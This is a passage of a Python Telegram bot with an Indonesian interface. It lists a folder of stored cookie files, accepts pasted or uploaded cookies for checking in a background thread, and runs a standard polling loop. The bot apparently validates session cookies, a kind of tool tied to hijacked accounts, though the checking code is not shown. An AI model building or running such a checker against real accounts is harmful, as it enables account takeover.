        cookie_files = get_sorted_cookie_files()
        if not cookie_files:
            send_message(chat_id, "📂 <b>Folder cookies kosong.</b>\n\nKirim cookie .txt atau klik 📋 Saya paste cookie sendiri.")
            return
        total = len(cookie_files)
        list_text = f"📂 <b>Daftar Cookies ({total})</b>\n\n"
        for i, f in enumerate(cookie_files[:20], 1):
            list_text += f"{i}. {f}\n"
        if total > 20:
            list_text += f"\n...dan {total - 20} lagi"
        send_message(chat_id, list_text, parse_mode="HTML", keyboard=[[t(chat_id, "menu")]])
        return

    if text.startswith("/"):
        return

    if chat_id not in awaiting_cookie:
        return
    awaiting_cookie.discard(chat_id)

    send_message(chat_id, t(chat_id, "checking"))
    logger.info(f"Checking cookie from {user} ({chat_id})")

    threading.Thread(
        target=process_cookie_async,
        args=(chat_id, text, user),
        daemon=True,
    ).start()

def delete_webhook():
    try:
        url = f"{API_BASE}{BOT_TOKEN}/deleteWebhook"
        resp = requests.post(url, timeout=10)
        result = resp.json()
        if result.get("ok"):
            logger.info("Webhook berhasil dihapus. Bot siap polling.")
        else:
            logger.warning(f"Gagal hapus webhook: {result}")
    except Exception as e:
        logger.warning(f"Error saat hapus webhook: {e}")

def main():
    global BOT_TOKEN
    if not BOT_TOKEN:
        BOT_TOKEN = os.environ.get("BOT_TOKEN", "") or input("Bot Token: ").strip()

    if not BOT_TOKEN:
        print("BOT_TOKEN wajib diisi.")
        return

    try:
        me = requests.get(f"{API_BASE}{BOT_TOKEN}/getMe", timeout=10).json()
        if me.get("ok"):
            logger.info(f"Bot @{me['result']['username']} authenticated")
        else:
            print("Token bot tidak valid!")
            return
    except Exception as e:
        print(f"Gagal konek ke Telegram: {e}")
        return

    delete_webhook()

    try:
        commands_url = f"{API_BASE}{BOT_TOKEN}/setMyCommands"
        commands = [
            {"command": "start", "description": "Tampilkan menu"},
            {"command": "help", "description": "Cara menggunakan bot"},
            {"command": "about", "description": "Tentang bot ini"},
            {"command": "guide", "description": "Cara pakai link mobile"},
            {"command": "language", "description": "Ganti bahasa EN/ID"},
        ]
        requests.post(commands_url, json={"commands": commands}, timeout=10)
    except Exception:
        pass

    logger.info("Bot mulai polling... Tekan Ctrl+C untuk stop.")

    offset = 0
    while True:
        try:
            url = f"{API_BASE}{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps(["message"])
            }, timeout=35)

            data = resp.json()
            if not data.get("ok"):
                logger.warning(f"getUpdates error: {data}")
                time.sleep(3)
                continue

            for update in data.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message")
                if msg and msg.get("text"):
                    try:
                        handle_message(msg)
                    except Exception as e:
                        logger.exception(f"Error handle message: {e}")

        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.RequestException as e:
            logger.warning(f"Network error: {e}")
            time.sleep(5)
        except KeyboardInterrupt:
            logger.info("Bot dihentikan.")
            break
        except Exception as e:
            logger.exception(f"Unexpected error: {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
